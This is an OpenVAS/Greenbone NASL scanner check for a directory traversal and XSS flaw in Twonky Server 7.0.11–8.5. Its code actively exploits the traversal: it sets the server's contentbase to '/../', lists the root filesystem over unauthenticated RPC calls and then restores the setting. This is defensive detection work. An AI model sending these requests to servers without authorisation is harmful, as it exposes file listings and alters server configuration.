# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:twonky:twonky_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108436");
  script_version("2024-06-26T05:05:39+0000");
  script_tag(name:"last_modification", value:"2024-06-26 05:05:39 +0000 (Wed, 26 Jun 2024)");
  script_tag(name:"creation_date", value:"2018-04-07 12:17:00 +0200 (Sat, 07 Apr 2018)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-04-20 13:16:00 +0000 (Fri, 20 Apr 2018)");
  script_cve_id("CVE-2018-7171", "CVE-2018-7203");

  script_name("Twonky Server 7.0.11 - 8.5 Multiple Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_twonky_server_detect.nasl");
  script_require_ports("Services/www", 9000);
  script_mandatory_keys("twonky/server/http/detected");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/146938/TwonkyMedia-Server-7.0.11-8.5-Directory-Traversal.html");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/146939/TwonkyMedia-Server-7.0.11-8.5-Cross-Site-Scripting.html");
  script_xref(name:"URL", value:"https://github.com/mechanico/sharingIsCaring/blob/master/twonky.py");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/44350/");
  script_xref(name:"URL", value:"http://docs.twonky.com/display/TRN/Twonky+Server+8.5.1");

  script_tag(name:"summary", value:"Twonky Server is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP POST request and check the response.");

  script_tag(name:"insight", value:"The following vulnerabilities exist:

  Directory traversal vulnerability in Twonky Server allows remote attackers to share the contents of arbitrary directories
  via a .. (dot dot) in the contentbase parameter to rpc/set_all.

  Cross-site scripting (XSS) vulnerability in Twonky Server allows remote attackers to inject arbitrary web script or HTML
  via the friendlyname parameter to rpc/set_all.

  NOTE: If the WebGUI is password protected both vulnerabilities can be misused by an authenticated attacker only.");

  script_tag(name:"affected", value:"Twonky Server versions 7.0.11 through 8.5.");

  script_tag(name:"solution", value:"Update to version 8.5.1 or later.

  As a workaround set a strong password for the WebGUI which blocks access to the affected RCP calls.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");
include("list_array_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir  = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

# First check if the RPC service is password protected.
url = dir + "/rpc/get_option?contentbase";
req = http_get( port:port, item:url );
res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
if( ! res || "Unauthorized" >< res || "Access to this page is restricted" >< res || res =~ "^HTTP/1\.[01] 401" ) exit( 0 );

# Grab the current "contentbase" so we can reset it later.
url = dir + "/rpc/get_option?contentbase";
req = http_get( port:port, item:url );
res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
contentbase = egrep( string:res, pattern:"^/[^\r\n]+" );

# So now set the contentbase to the root on the disk
url1 = dir + "/rpc/set_option?contentbase=/../";
req1 = http_get( port:port, item:url1 );
res1 = http_keepalive_send_recv( port:port, data:req1, bodyonly:FALSE );

if( res1 =~ "^HTTP/1\.[01] 200" && "/../" >< res1 ) {

  # And now get the content of the root dir
  url2 = dir + "/rpc/dir?path=/";
  req2 = http_get( port:port, item:url2 );
  res2 = http_keepalive_send_recv( port:port, data:req2, bodyonly:TRUE );

  # The return contains something like:
  # 002D/bin
  # 019D/var
  if( res2 && egrep( string:res2, pattern:"^[0-9]{3}D/(bin|dev|etc|home|lib|linuxrc|mnt|nfs|opt|proc|root|sbin|shares|sys|tmp|usr|var)" ) ) {

    info['URL 1: Overwrite contentbase']    = http_report_vuln_url( port:port, url:url1, url_only:TRUE );
    info['URL 2: Read directory structure'] = http_report_vuln_url( port:port, url:url2, url_only:TRUE );

    # If we where able to grab the previous contentbase reset it again.
    if( contentbase ) {
      url3 = dir + "/rpc/set_option?contentbase=" + chomp( contentbase );
      req3 = http_get( port:port, item:url3 );
      http_keepalive_send_recv( port:port, data:req3, bodyonly:TRUE );
      info['URL 3: Reset contentbase'] = http_report_vuln_url( port:port, url:url3, url_only:TRUE );
    }

    report  = 'By doing the following requests:\n\n';
    report += text_format_table( array:info ) + '\n\n';
    report += 'it was possible to read the directory structure of the root filesystem.';
    report += '\n\nResult:\n' + res2;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
